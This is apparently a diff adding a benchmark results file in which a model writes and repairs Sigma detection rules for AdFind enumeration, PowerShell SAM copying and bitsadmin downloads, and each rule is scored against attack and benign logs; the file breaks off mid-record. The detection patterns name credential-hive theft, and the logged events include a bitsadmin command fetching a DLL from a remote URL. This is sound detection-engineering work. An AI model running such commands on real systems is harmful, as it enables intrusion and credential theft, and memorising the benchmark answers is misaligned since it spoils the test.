@@ -1,0 +1,3456 @@
+{
+ "started": "2026-10-27T06:54:12.476686+00:00",
+ "finished": "2026-10-27T07:04:41.222680+00:00",
+ "model": "nvidia/nemotron-3-super-120b-a12b",
+ "max_repairs": 3,
+ "rule_format": "structured",
+ "thinking": "on",
+ "limit": null,
+ "rows": [
+  {
+   "task": {
+    "rule_id": "514e7e3e-b3b4-4a67-af60-be20f139198b",
+    "rule_path": "rules/windows/process_creation/proc_creation_win_pua_adfind_execution.yml",
+    "title": "PUA - AdFind.EXE Execution",
+    "category": "process_creation",
+    "date": "2025-02-26",
+    "year_2026": false,
+    "sample": "regression_data/rules/windows/process_creation/proc_creation_win_pua_adfind_execution/514e7e3e-b3b4-4a67-af60-be20f139198b.evtx",
+    "sample_sha256": "5175ff0f3f0c18f493dd1ae4189185ec4f26b9852ce764bc728ab7e0ae276ec4"
+   },
+   "spec": {
+    "behavior": "",
+    "logsource_category": "process_creation",
+    "observables": [],
+    "techniques": [
+     {
+      "id": "T1087.002",
+      "quote": "attack.t1087.002"
+     }
+    ]
+   },
+   "spec_dropped": [
+    {
+     "kind": "observable",
+     "item": {
+      "field": "Image",
+      "match": "endswith",
+      "value": "\\adfind.exe",
+      "quote": "Adfind.exe"
+     },
+     "reason": "value not contained in its quote"
+    }
+   ],
+   "success": true,
+   "stop_reason": "acceptance criteria passed",
+   "best_index": 0,
+   "history": [
+    {
+     "index": 0,
+     "action": "generate",
+     "rule_text": "title: AdFind.exe Execution\nid: d4e9a6dc-97a7-47db-9226-d367dd44cae1\nstatus: experimental\ndescription: Detects execution of AdFind.exe utility, which can be used for reconnaissance in an Active Directory environment.\nauthor: Shakedown\ndate: '2026-10-27'\ntags:\n- attack.discovery\n- attack.t1087.002\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    Image|endswith: \\AdFind.exe\n    OriginalFileName: AdFind.exe\n  condition: selection\nfalsepositives:\n- Unknown\nlevel: high\n",
+     "sha256": "c8ed0f32ba99ede225a8616a0316045886060c02fde249b45b302229da602e5c",
+     "validation": {
+      "ok": true,
+      "errors": [],
+      "sigma_output": "\n=== Summary ===\nFound 0 errors, 0 condition errors and 0 issues.\nNo rule errors found.\nNo condition errors found.\nNo validation issues found.\nParsing Sigma rules\nChecking Sigma rules\n"
+     },
+     "evaluation": {
+      "attack_total": 1,
+      "attack_detected": 1,
+      "attack_missed": [],
+      "attack_events_hit": 1,
+      "benign": {
+       "benign_dev_win7": {
+        "files_total": 129,
+        "files_with_hits": 0,
+        "hits": 0,
+        "examples": []
+       }
+      },
+      "attack_events": [],
+      "seconds": 15.73
+     },
+     "tokens": 1570,
+     "latency_s": 5.81,
+     "evaluator_error": null,
+     "resamples": 0
+    }
+   ],
+   "oneshot_heldout": {
+    "files_total": 352,
+    "files_with_hits": 0,
+    "hits": 0,
+    "examples": []
+   },
+   "best_heldout": {
+    "files_total": 352,
+    "files_with_hits": 0,
+    "hits": 0,
+    "examples": []
+   },
+   "expert_dev": {
+    "attack_total": 1,
+    "attack_detected": 1,
+    "attack_missed": [],
+    "attack_events_hit": 1,
+    "benign": {
+     "benign_dev_win7": {
+      "files_total": 129,
+      "files_with_hits": 0,
+      "hits": 0,
+      "examples": []
+     }
+    },
+    "attack_events": [],
+    "seconds": 24.36
+   },
+   "expert_heldout": {
+    "files_total": 352,
+    "files_with_hits": 0,
+    "hits": 0,
+    "examples": []
+   },
+   "expert_text": "title: PUA - AdFind.EXE Execution\nid: 514e7e3e-b3b4-4a67-af60-be20f139198b\nrelated:\n    - id: 455b9d50-15a1-4b99-853f-8d37655a4c1b\n      type: similar\nstatus: experimental\ndescription: Detects execution of Adfind.exe utility, which can be used for reconnaissance in an Active Directory environment\nreferences:\n    - https://www.joeware.net/freetools/tools/adfind/\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1087.002/T1087.002.md\nauthor: Swachchhanda Shrawan Poudel (Nextron Systems)\ndate: 2025-02-26\ntags:\n    - attack.discovery\n    - attack.t1087.002\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        - Image|endswith: '\\AdFind.exe'\n        - OriginalFileName: 'AdFind.exe'\n        - Hashes|contains:\n              - 'IMPHASH=d144de8117df2beceaba2201ad304764'\n              - 'IMPHASH=12ce1c0f3f5837ecc18a3782408fa975'\n              - 'IMPHASH=bca5675746d13a1f246e2da3c2217492'\n              - 'IMPHASH=4fbf3f084fbbb2470b80b2013134df35'\n              - 'IMPHASH=49b639b4acbecc49d72a01f357aa4930'\n              - 'IMPHASH=53e117a96057eaf19c41380d0e87f1c2'\n              - 'IMPHASH=680dad9e300346e05a85023965867201'\n              - 'IMPHASH=21aa085d54992511b9f115355e468782'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\nregression_tests_path: regression_data/rules/windows/process_creation/proc_creation_win_pua_adfind_execution/info.yml\n"
+  },
+  {
+   "task": {
+    "rule_id": "1af57a4b-460a-4738-9034-db68b880c665",
+    "rule_path": "rules/windows/process_creation/proc_creation_win_powershell_sam_access.yml",
+    "title": "PowerShell SAM Copy",
+    "category": "process_creation",
+    "date": "2021-07-29",
+    "year_2026": false,
+    "sample": "regression_data/rules/windows/process_creation/proc_creation_win_powershell_sam_access/1af57a4b-460a-4738-9034-db68b880c665.evtx",
+    "sample_sha256": "3eaf8abff49190087b465ae76b6f62eb9343a45f6535267f185a38ecc2ef1c06"
+   },
+   "spec": {
+    "behavior": "",
+    "logsource_category": "process_creation",
+    "observables": [],
+    "techniques": []
+   },
+   "spec_dropped": [],
+   "success": true,
+   "stop_reason": "acceptance criteria passed",
+   "best_index": 0,
+   "history": [
+    {
+     "index": 0,
+     "action": "generate",
+     "rule_text": "title: Suspicious PowerShell Access to SAM Hive\nid: 153a0a05-e312-44f6-b697-c5bdf44f121f\nstatus: experimental\ndescription: Detects PowerShell scripts attempting to read or copy the SAM registry hive, a common credential access technique.\nauthor: Shakedown\ndate: '2026-10-27'\ntags:\n- attack.credential-access\n- attack.t1003.002\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection_img:\n    Image|endswith:\n    - \\\\powershell.exe\n    - \\\\pwsh.exe\n  selection_cmd:\n    CommandLine|contains:\n    - \\\\sam\n    - reg save\n    - sam.save\n    - Get-ItemProperty -Path HKLM:\\\\SAM\n    - config\\\\sam\n  condition: selection_img and selection_cmd\nfalsepositives:\n- Legitimate administrative tasks that backup the SAM hive may trigger this rule.\nlevel: high\n",
+     "sha256": "aac0c6db4638266f7f77280db1cbe2f4a17ab5d70ebaff9298fb54e1f647d50b",
+     "validation": {
+      "ok": true,
+      "errors": [],
+      "sigma_output": "\n=== Summary ===\nFound 0 errors, 0 condition errors and 0 issues.\nNo rule errors found.\nNo condition errors found.\nNo validation issues found.\nParsing Sigma rules\nChecking Sigma rules\n"
+     },
+     "evaluation": {
+      "attack_total": 1,
+      "attack_detected": 1,
+      "attack_missed": [],
+      "attack_events_hit": 1,
+      "benign": {
+       "benign_dev_win7": {
+        "files_total": 129,
+        "files_with_hits": 0,
+        "hits": 0,
+        "examples": []
+       }
+      },
+      "attack_events": [],
+      "seconds": 20.52
+     },
+     "tokens": 1804,
+     "latency_s": 8.31,
+     "evaluator_error": null,
+     "resamples": 0
+    }
+   ],
+   "oneshot_heldout": {
+    "files_total": 352,
+    "files_with_hits": 0,
+    "hits": 0,
+    "examples": []
+   },
+   "best_heldout": {
+    "files_total": 352,
+    "files_with_hits": 0,
+    "hits": 0,
+    "examples": []
+   },
+   "expert_dev": {
+    "attack_total": 1,
+    "attack_detected": 1,
+    "attack_missed": [],
+    "attack_events_hit": 1,
+    "benign": {
+     "benign_dev_win7": {
+      "files_total": 129,
+      "files_with_hits": 0,
+      "hits": 0,
+      "examples": []
+     }
+    },
+    "attack_events": [],
+    "seconds": 20.08
+   },
+   "expert_heldout": {
+    "files_total": 352,
+    "files_with_hits": 0,
+    "hits": 0,
+    "examples": []
+   },
+   "expert_text": "title: PowerShell SAM Copy\nid: 1af57a4b-460a-4738-9034-db68b880c665\nstatus: test\ndescription: Detects suspicious PowerShell scripts accessing SAM hives\nreferences:\n    - https://twitter.com/splinter_code/status/1420546784250769408\nauthor: Florian Roth (Nextron Systems)\ndate: 2021-07-29\nmodified: 2023-01-06\ntags:\n    - attack.credential-access\n    - attack.t1003.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_1:\n        CommandLine|contains|all:\n            - '\\HarddiskVolumeShadowCopy'\n            - 'System32\\config\\sam'\n    selection_2:\n        CommandLine|contains:\n            - 'Copy-Item'\n            - 'cp $_.'\n            - 'cpi $_.'\n            - 'copy $_.'\n            - '.File]::Copy('\n    condition: all of selection*\nfalsepositives:\n    - Some rare backup scenarios\n    - PowerShell scripts fixing HiveNightmare / SeriousSAM ACLs\nlevel: high\nregression_tests_path: regression_data/rules/windows/process_creation/proc_creation_win_powershell_sam_access/info.yml\n"
+  },
+  {
+   "task": {
+    "rule_id": "455b9d50-15a1-4b99-853f-8d37655a4c1b",
+    "rule_path": "rules/windows/process_creation/proc_creation_win_pua_adfind_enumeration.yml",
+    "title": "PUA - Suspicious ActiveDirectory Enumeration Via AdFind.EXE",
+    "category": "process_creation",
+    "date": "2021-12-13",
+    "year_2026": false,
+    "sample": "regression_data/rules/windows/process_creation/proc_creation_win_pua_adfind_enumeration/455b9d50-15a1-4b99-853f-8d37655a4c1b.evtx",
+    "sample_sha256": "bff1d6e5f1d050d414582f9fb96dc3420947ddacd0eacea4b7cb515dcc897e34"
+   },
+   "spec": {
+    "behavior": "",
+    "logsource_category": "process_creation",
+    "observables": [],
+    "techniques": [
+     {
+      "id": "T1087.002",
+      "quote": "attack.t1087.002"
+     }
+    ]
+   },
+   "spec_dropped": [
+    {
+     "kind": "observable",
+     "item": {
+      "field": "Image",
+      "match": "endswith",
+      "value": "\\\\adfind.exe",
+      "quote": "AdFind.EXE"
+     },
+     "reason": "value not contained in its quote"
+    },
+    {
+     "kind": "observable",
+     "item": {
+      "field": "CommandLine",
+      "match": "contains",
+      "value": "-g_c",
+      "quote": "known AdFind CLI flags"
+     },
+     "reason": "value not contained in its quote"
+    }
+   ],
+   "success": true,
+   "stop_reason": "acceptance criteria passed",
+   "best_index": 2,
+   "history": [
+    {
+     "index": 0,
+     "action": "generate",
+     "rule_text": "title: Suspicious Active Directory Enumeration via AdFind.exe\nid: a25473a0-8925-423d-a09b-1aa0eeb551d9\nstatus: experimental\ndescription: Detects usage of AdFind.exe with command-line arguments commonly used for Active Directory enumeration, such\n  as global catalog search, subtree search, or LDAP filters targeting users, computers, or groups.\nauthor: Shakedown\ndate: '2026-10-27'\ntags:\n- attack.discovery\n- attack.t1087.002\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection_image:\n    Image|endswith: \\\\adfind.exe\n  selection_cmd:\n    CommandLine|contains:\n    - -gc\n    - -subtree\n    - -f\n    - -sc\n    - -csv\n    - -td\n    - -nologo\n    - -q\n  condition: selection_image and selection_cmd\nfalsepositives:\n- Legitimate use of AdFind for administrative tasks with similar flags may trigger false positives; consider excluding known\n  admin accounts or specific command lines.\nlevel: high\n",
+     "sha256": "117c4f6f1f0b98617826e8d2baf166acc051f89da1c9a050a9037245ea46a5ec",
+     "validation": {
+      "ok": true,
+      "errors": [],
+      "sigma_output": "\n=== Summary ===\nFound 0 errors, 0 condition errors and 0 issues.\nNo rule errors found.\nNo condition errors found.\nNo validation issues found.\nParsing Sigma rules\nChecking Sigma rules\n"
+     },
+     "evaluation": {
+      "attack_total": 1,
+      "attack_detected": 0,
+      "attack_missed": [
+       "455b9d50-15a1-4b99-853f-8d37655a4c1b.evtx"
+      ],
+      "attack_events_hit": 0,
+      "benign": {
+       "benign_dev_win7": {
+        "files_total": 129,
+        "files_with_hits": 0,
+        "hits": 0,
+        "examples": []
+       }
+      },
+      "attack_events": [
+       {
+        "EventID": 1,
+        "Channel": "Microsoft-Windows-Sysmon/Operational",
+        "RuleName": "-",
+        "UtcTime": "2025-10-23 09:37:40.972",
+        "ProcessGuid": "{14207d89-f764-68f9-2410-000000003f02}",
+        "ProcessId": "4316",
+        "Image": "C:\\Users\\SwachchhandaP\\Downloads\\AdFind\\AdFind.exe",
+        "FileVersion": "1.62.0.6172",
+        "Description": "-",
+        "Product": "AdFind",
+        "Company": "www.joeware.net",
+        "OriginalFileName": "AdFind.exe",
+        "CommandLine": "AdFind.exe   -default -s base lockoutduration lockoutthreshold lockoutobservationwindow maxpwdage minpwdage minpwdlength pwdhistorylength pwdproperties",
+        "CurrentDirectory": "C:\\Users\\SwachchhandaP\\Downloads\\AdFind\\",
+        "User": "MIDGARDNET\\SwachchhandaP",
+        "LogonGuid": "{14207d89-91e6-68f9-0f94-460000000000}",
+        "LogonId": "0x000000000046940f",
+        "TerminalSessionId": "2",
+        "IntegrityLevel": "Medium",
+        "Hashes": "MD5=B0C4A9C1D8C4641A161B3DBF111454DF,SHA256=484DD00E85C033FBFD506B956AC0ACD29B30F239755ED753A2788A842425B384,IMPHASH=680DAD9E300346E05A85023965867201",
+        "ParentProcessGuid": "{14207d89-f57c-68f9-d70f-000000003f02}",
+        "ParentProcessId": "6488",
+        "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+        "ParentCommandLine": "\"C:\\Windows\\System32\\cmd.exe\" ",
+        "ParentUser": "MIDGARDNET\\SwachchhandaP"
+       }
+      ],
+      "seconds": 24.36
+     },
+     "tokens": 3707,
+     "latency_s": 13.95,
+     "evaluator_error": null,
+     "resamples": 1
+    },
+    {
+     "index": 1,
+     "action": "repair",
+     "rule_text": "{\n \"title\": \"Suspicious Active Directory Enumeration via AdFind.exe\",\n \"description\": \"Detects usage of AdFind.exe with command-line arguments commonly used for Active Directory enumeration, such\\n  as global catalog search, subtree search, or LDAP filters targeting users, computers, or groups.\",\n \"tags\": [\n  \"attack.discovery\",\n  \"attack.t1087.002\"\n ],\n \"logsource_category\": \"process_creation\",\n \"groups\": [],\n \"condition\": \"\",\n \"falsepositives\": [\n  \"Legitimate use of Find for administrative tasks with similar flags may trigger false positives; consider excluding known\\n  admin accounts or specific command lines.\"\n ],\n \"level\": \"high\"\n}",
+     "sha256": "f506b0ddb68ea79e53a001317c15f5968ceb1f333314e14955320a8e2b1cb666",
+     "validation": {
+      "ok": false,
+      "errors": [
+       "rule could not be built: rule has no condition"
+      ],
+      "sigma_output": ""
+     },
+     "evaluation": null,
+     "tokens": 7972,
+     "latency_s": 25.55,
+     "evaluator_error": null,
+     "resamples": 3
+    },
+    {
+     "index": 2,
+     "action": "repair",
+     "rule_text": "title: Suspicious Active Directory Enumeration via AdFind.exe\nid: a25473a0-8925-423d-a09b-1aa0eeb551d9\nstatus: experimental\ndescription: \"Detects usage of AdFind.exe with command-line arguments commonly used for Active Directory enumeration, such\\n\\\n  \\  as global catalog search, subtree search, or LDAP filters targeting users, computers, or groups.\"\nauthor: Shakedown\ndate: '2026-10-27'\ntags:\n- attack.discovery\n- attack.t1087.002\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    Image|endswith: \\AdFind.exe\n  condition: selection\nfalsepositives:\n- \"Legitimate use of Find for administrative tasks with similar flags may trigger false positives; consider excluding known\\n\\\n  \\  admin accounts or specific command lines.\"\nlevel: high\n",
+     "sha256": "d932e5031bf69c2d8b59ab7c7452b9529a035643d1ca837c783cb163d88ce309",
+     "validation": {
+      "ok": true,
+      "errors": [],
+      "sigma_output": "\n=== Summary ===\nFound 0 errors, 0 condition errors and 0 issues.\nNo rule errors found.\nNo condition errors found.\nNo validation issues found.\nParsing Sigma rules\nChecking Sigma rules\n"
+     },
+     "evaluation": {
+      "attack_total": 1,
+      "attack_detected": 1,
+      "attack_missed": [],
+      "attack_events_hit": 1,
+      "benign": {
+       "benign_dev_win7": {
+        "files_total": 129,
+        "files_with_hits": 0,
+        "hits": 0,
+        "examples": []
+       }
+      },
+      "attack_events": [],
+      "seconds": 18.11
+     },
+     "tokens": 1180,
+     "latency_s": 5.01,
+     "evaluator_error": null,
+     "resamples": 0
+    }
+   ],
+   "oneshot_heldout": {
+    "files_total": 352,
+    "files_with_hits": 0,
+    "hits": 0,
+    "examples": []
+   },
+   "best_heldout": {
+    "files_total": 352,
+    "files_with_hits": 0,
+    "hits": 0,
+    "examples": []
+   },
+   "expert_dev": {
+    "attack_total": 1,
+    "attack_detected": 1,
+    "attack_missed": [],
+    "attack_events_hit": 1,
+    "benign": {
+     "benign_dev_win7": {
+      "files_total": 129,
+      "files_with_hits": 0,
+      "hits": 0,
+      "examples": []
+     }
+    },
+    "attack_events": [],
+    "seconds": 9.0
+   },
+   "expert_heldout": {
+    "files_total": 352,
+    "files_with_hits": 0,
+    "hits": 0,
+    "examples": []
+   },
+   "expert_text": "title: PUA - Suspicious ActiveDirectory Enumeration Via AdFind.EXE\nid: 455b9d50-15a1-4b99-853f-8d37655a4c1b\nrelated:\n    - id: 9a132afa-654e-11eb-ae93-0242ac130002\n      type: similar\n    - id: 514e7e3e-b3b4-4a67-af60-be20f139198b\n      type: similar\nstatus: test\ndescription: Detects active directory enumeration activity using known AdFind CLI flags\nreferences:\n    - https://www.joeware.net/freetools/tools/adfind/\n    - https://social.technet.microsoft.com/wiki/contents/articles/7535.adfind-command-examples.aspx\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1087.002/T1087.002.md\nauthor: frack113\ndate: 2021-12-13\nmodified: 2023-03-05\ntags:\n    - attack.discovery\n    - attack.t1087.002\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_password: # Listing password policy\n        CommandLine|contains:\n            - lockoutduration\n            - lockoutthreshold\n            - lockoutobservationwindow\n            - maxpwdage\n            - minpwdage\n            - minpwdlength\n            - pwdhistorylength\n            - pwdproperties\n    selection_enum_ad: # Enumerate Active Directory Admins\n        CommandLine|contains: '-sc admincountdmp'\n    selection_enum_exchange: # Enumerate Active Directory Exchange AD Objects\n        CommandLine|contains: '-sc exchaddresses'\n    condition: 1 of selection_*\nfalsepositives:\n    - Authorized administrative activity\nlevel: high\nregression_tests_path: regression_data/rules/windows/process_creation/proc_creation_win_pua_adfind_enumeration/info.yml\n"
+  },
+  {
+   "task": {
+    "rule_id": "5b80a791-ad9b-4b75-bcc1-ad4e1e89c200",
+    "rule_path": "rules/windows/process_creation/proc_creation_win_bitsadmin_download_susp_extensions.yml",
+    "title": "File With Suspicious Extension Downloaded Via Bitsadmin",
+    "category": "process_creation",
+    "date": "2022-06-28",
+    "year_2026": false,
+    "sample": "regression_data/rules/windows/process_creation/proc_creation_win_bitsadmin_download_susp_extensions/5b80a791-ad9b-4b75-bcc1-ad4e1e89c200.evtx",
+    "sample_sha256": "fd158896a51a4f217ab55896cc965dc6b43c60cdd13d204518efb5fb4a71d783"
+   },
+   "spec": {
+    "behavior": "",
+    "logsource_category": "process_creation",
+    "observables": [],
+    "techniques": [
+     {
+      "id": "T1197",
+      "quote": "ATT&CK tags: attack.persistence, attack.execution, attack.stealth, attack.t1197, attack.s0190, attack.t1036.003, attack.command-and-control, attack.t1105"
+     },
+     {
+      "id": "S0190",
+      "quote": "ATT&CK tags: attack.persistence, attack.execution, attack.stealth, attack.t1197, attack.s0190, attack.t1036.003, attack.command-and-control, attack.t1105"
+     },
+     {
+      "id": "T1036.003",
+      "quote": "ATT&CK tags: attack.persistence, attack.execution, attack.stealth, attack.t1197, attack.s0190, attack.t1036.003, attack.command-and-control, attack.t1105"
+     },
+     {
+      "id": "T1105",
+      "quote": "ATT&CK tags: attack.persistence, attack.execution, attack.stealth, attack.t1197, attack.s0190, attack.t1036.003, attack.command-and-control, attack.t1105"
+     }
+    ]
+   },
+   "spec_dropped": [
+    {
+     "kind": "observable",
+     "item": {
+      "field": "Image",
+      "match": "endswith",
+      "value": "\\bitsadmin.exe",
+      "quote": "Detects usage of bitsadmin downloading a file with a suspicious extension"
+     },
+     "reason": "value not contained in its quote"
+    }
+   ],
+   "success": false,
+   "stop_reason": "repair budget exhausted",
+   "best_index": 0,
+   "history": [
+    {
+     "index": 0,
+     "action": "generate",
+     "rule_text": "title: Bitsadmin Download of Suspicious Extension\nid: 1a750b83-ca40-4cf0-bd70-867b97a62179\nstatus: experimental\ndescription: Detects usage of bitsadmin to download a file with a suspicious extension, often associated with persistence,\n  execution, stealth, and command-and-control activities.\nauthor: Shakedown\ndate: '2026-10-27'\ntags:\n- attack.t1197\n- attack.s0190\n- attack.t1036.003\n- attack.t1105\n- attack.persistence\n- attack.execution\n- attack.stealth\n- attack.command-and-control\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    Image|endswith: \\\\bitsadmin.exe\n    CommandLine|contains: /transfer\n    CommandLine|re: \\\\.(exe|dll|scr|ps1|js|vbs|bat|cmd)(\\\\s|$)\n  condition: selection\nfalsepositives:\n- Legitimate bitsadmin transfers of approved files with safe extensions.\nlevel: high\n",
+     "sha256": "cbcf315e13f5f65ae714efd67c50bb8f505e048fc58a4ce800b5dd6c307bd69a",
+     "validation": {
+      "ok": true,
+      "errors": [],
+      "sigma_output": "\n=== Summary ===\nFound 0 errors, 0 condition errors and 0 issues.\nNo rule errors found.\nNo condition errors found.\nNo validation issues found.\nParsing Sigma rules\nChecking Sigma rules\n"
+     },
+     "evaluation": {
+      "attack_total": 1,
+      "attack_detected": 0,
+      "attack_missed": [
+       "5b80a791-ad9b-4b75-bcc1-ad4e1e89c200.evtx"
+      ],
+      "attack_events_hit": 0,
+      "benign": {
+       "benign_dev_win7": {
+        "files_total": 129,
+        "files_with_hits": 0,
+        "hits": 0,
+        "examples": []
+       }
+      },
+      "attack_events": [
+       {
+        "EventID": 1,
+        "Channel": "Microsoft-Windows-Sysmon/Operational",
+        "RuleName": "-",
+        "UtcTime": "2025-12-10 04:22:10.201",
+        "ProcessGuid": "{0197231e-f572-6938-8b10-000000000800}",
+        "ProcessId": "13808",
+        "Image": "C:\\Windows\\System32\\bitsadmin.exe",
+        "FileVersion": "7.8.26100.1 (WinBuild.160101.0800)",
+        "Description": "BITS administration utility",
+        "Product": "Microsoft\u00ae Windows\u00ae Operating System",
+        "Company": "Microsoft Corporation",
+        "OriginalFileName": "bitsadmin.exe",
+        "CommandLine": "bitsadmin  /transfer n https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1047/bin/calc.dll C:\\Users\\xodih\\AppData\\Local\\Temp\\calc.dll",
+        "CurrentDirectory": "C:\\Program\u2002Files\\",
+        "User": "swachchhanda\\xodih",
+        "LogonGuid": "{0197231e-ab9f-67aa-fb17-030000000000}",
+        "LogonId": "0x00000000000317fb",
+        "TerminalSessionId": "1",
+        "IntegrityLevel": "Medium",
+        "Hashes": "MD5=4FCFE1D61E6D962F06CE2B61FC11BC0F,SHA256=6FEB16602A2FD1158C6F7E56E3B05A5E9AC01E88089535978C890EC6954A5AFA,IMPHASH=44794EEDDEB70144ABA2F1483E762F30",
+        "ParentProcessGuid": "{0197231e-f570-6938-8a10-000000000800}",
+        "ParentProcessId": "14736",
+        "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+        "ParentCommandLine": "\"C:\\WINDOWS\\system32\\cmd.exe\"",
+        "ParentUser": "swachchhanda\\xodih"
+       }
+      ],
+      "seconds": 24.41
+     },
+     "tokens": 3280,
+     "latency_s": 10.8,
+     "evaluator_error": null,
+     "resamples": 0
+    },
+    {
+     "index": 1,
+     "action": "repair",
+     "rule_text": "{\n \"title\": \"Bitsadmin Download of Suspicious Extension\",\n \"description\": \"Detects usage of bitsadmin to download a file with a suspicious extension, often associated with persistence,\\n  execution, stealth, and command-and-control activities.\",\n \"tags\": [\n  \"attack.t1197\",\n  \"attack.s0190\",\n  \"attack.t1036.003\",\n  \"attack.t1105\",\n  \"attack.persistence\",\n  \"attack.execution\",\n  \"attack.stealth\",\n  \"attack.command-and-control\"\n ],\n \"logsource_category\": \"process_creation\",\n \"groups\": [\n  {\n   \"name\": \"selection\",\n   \"fields\": [\n    {\n     \"field\": \"Image\",\n     \"modifier\": \"endswith\",\n     \"values\": [\n      \"\\\\\\\\bitsadmin.exe\"\n     ]\n    },\n    {\n     \"field\": \"CommandLine\",\n     \"modifier\": \"contains\",\n     \"values\": [\n      \"/transfer\"\n     ]\n    },\n    {\n     \"field\": \"CommandLine\",\n     \"modifier\": \"re\",\n     \"values\": [\n      \"\\\\\\\\.(exe|dll|scr|ps1|js|vbs|bat|cmd)(\\\\\\\\s|$)\"\n     ]\n    }\n   ]\n  },\n  {\n   \"name\": \"condition\",\n   \"fields\": []\n  }\n ],\n \"condition\": \"selection\",\n \"falsepositives\": [\n  \"Legitimate bitsadmin transfers of approved files with safe extensions.\"\n ],\n \"level\": \"high\"\n}",
+     "sha256": "5ed8117a296924705a7b508aa47d3e3c53cfca6e24e1c9a2e0c6e5e43208d8e3",
+     "validation": {
+      "ok": false,
+      "errors": [
+       "rule could not be built: group name 'condition' is duplicated or reserved"
+      ],
+      "sigma_output": ""
+     },
+     "evaluation": null,
+     "tokens": 7685,
+     "latency_s": 29.86,
+     "evaluator_error": null,
+     "resamples": 1
+    },
+    {
+     "index": 2,
+     "action": "repair",
+     "rule_text": "title: Bitsadmin Download of Suspicious Extension\nid: 1a750b83-ca40-4cf0-bd70-867b97a62179\nstatus: experimental\ndescription: \"Detects usage of bitsadmin to download a file with a suspicious extension, often associated with persistence,\\n\\\n  \\  execution, stealth, and command-and-control activities.\"\nauthor: Shakedown\ndate: '2026-10-27'\ntags:\n- attack.t1197\n- attack.s0190\n- attack.t1036.003\n- attack.t1105\n- attack.persistence\n- attack.execution\n- attack.stealth\n- attack.command-and-control\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    Image|endswith: \\\\bitsadmin.exe\n    CommandLine|contains: /transfer\n    CommandLine|re: \\\\.(exe|dll|scr|ps1|js|vbs|bat|cmd)(\\\\s|$)\n  condition: selection\nfalsepositives:\n- Legitimate bitsadmin transfers of approved files with safe extensions.\nlevel: high\n",
+     "sha256": "e8816a58e73de355be227bfa5027614a601ce2a941230ba6ec47ae1d3e951cdc",
+     "validation": {
+      "ok": true,
+      "errors": [],
+      "sigma_output": "\n=== Summary ===\nFound 0 errors, 0 condition errors and 0 issues.\nNo rule errors found.\nNo condition errors found.\nNo validation issues found.\nParsing Sigma rules\nChecking Sigma rules\n"
+     },
+     "evaluation": {
+      "attack_total": 1,
+      "attack_detected": 0,
+      "attack_missed": [
+       "5b80a791-ad9b-4b75-bcc1-ad4e1e89c200.evtx"
+      ],
+      "attack_events_hit": 0,
+      "benign": {
+       "benign_dev_win7": {
+        "files_total": 129,
+        "files_with_hits": 0,
+        "hits": 0,
+        "examples": []
+       }
+      },
+      "attack_events": [
+       {
+        "EventID": 1,
+        "Channel": "Microsoft-Windows-Sysmon/Operational",
+        "RuleName": "-",
+        "UtcTime": "2025-12-10 04:22:10.201",
+        "ProcessGuid": "{0197231e-f572-6938-8b10-000000000800}",
+        "ProcessId": "13808",
+        "Image": "C:\\Windows\\System32\\bitsadmin.exe",
+        "FileVersion": "7.8.26100.1 (WinBuild.160101.0800)",
+        "Description": "BITS administration utility",
+        "Product": "Microsoft\u00ae Windows\u00ae Operating System",
+        "Company": "Microsoft Corporation",
+        "OriginalFileName": "bitsadmin.exe",
+        "CommandLine": "bitsadmin  /transfer n https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1047/bin/calc.dll C:\\Users\\xodih\\AppData\\Local\\Temp\\calc.dll",
+        "CurrentDirectory": "C:\\Program\u2002Files\\",
+        "User": "swachchhanda\\xodih",
+        "LogonGuid": "{0197231e-ab9f-67aa-fb17-030000000000}",
+        "LogonId": "0x00000000000317fb",
+        "TerminalSessionId": "1",
+        "IntegrityLevel": "Medium",
+        "Hashes": "MD5=4FCFE1D61E6D962F06CE2B61FC11BC0F,SHA256=6FEB16602A2FD1158C6F7E56E3B05A5E9AC01E88089535978C890EC6954A5AFA,IMPHASH=44794EEDDEB70144ABA2F1483E762F30",
+        "ParentProcessGuid": "{0197231e-f570-6938-8a10-000000000800}",
+        "ParentProcessId": "14736",
+        "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+        "ParentCommandLine": "\"C:\\WINDOWS\\system32\\cmd.exe\"",
+        "ParentUser": "swachchhanda\\xodih"
+       }
+      ],
+      "seconds": 17.62
+     },
+     "tokens": 1080,
+     "latency_s": 3.42,
+     "evaluator_error": null,
+     "resamples": 0
+    },
+    {
+     "index": 3,
+     "action": "repair",
+     "rule_text": "{\n \"title\": \"Bitsadmin Download of Suspicious Extension\",\n \"description\": \"Detects usage of bitsadmin to download a file with a suspicious extension, often associated with persistence, execution, stealth, and command-and-control activities.\",\n \"tags\": [\n  \"attack.t1197\",\n  \"attack.s0190\",\n  \"attack.t1036.003\",\n  \"attack.t1105\",\n  \"attack.persistence\",\n  \"attack.execution\",\n  \"attack.stealth\",\n  \"attack.command-and-control\"\n ],\n \"logsource_category\": \"process_creation\",\n \"groups\": [\n  {\n   \"name\": \"selection\",\n   \"fields\": [\n    {\n     \"field\": \"Image\",\n     \"modifier\": \"endswith\",\n     \"values\": [\n      \"bitsadmin.exe\"\n     ]\n    },\n    {\n     \"field\": \"CommandLine\",\n     \"modifier\": \"contains\",\n     \"values\": [\n      \"/transfer\"\n     ]\n    },\n    {\n     \"field\": \"CommandLine\",\n     \"modifier\": \"re\",\n     \"values\": [\n      \"\\\\\\\\.(exe|dll|scr|ps1|js|vbs|bat|cmd)(\\\\\\\\s|$)\"\n     ]\n    }\n   ]\n  },\n  {\n   \"name\": \"condition\",\n   \"fields\": []\n  }\n ],\n \"condition\": \"selection\",\n 